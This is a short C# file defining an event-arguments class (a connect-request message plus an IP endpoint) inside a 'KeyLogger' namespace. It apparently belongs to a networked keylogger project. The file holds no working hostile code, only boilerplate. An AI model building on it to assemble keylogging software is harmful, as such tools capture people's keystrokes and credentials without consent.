using System;
using System.Net;
using KeyLogger.Messages;

namespace KeyLogger.Network.Events
{
    public class DeviceRequestEventArgs : EventArgs
    {
        public DeviceConnectRequestMessage Message { get; set; }
        public IPEndPoint Ip { get; set; }
    }
}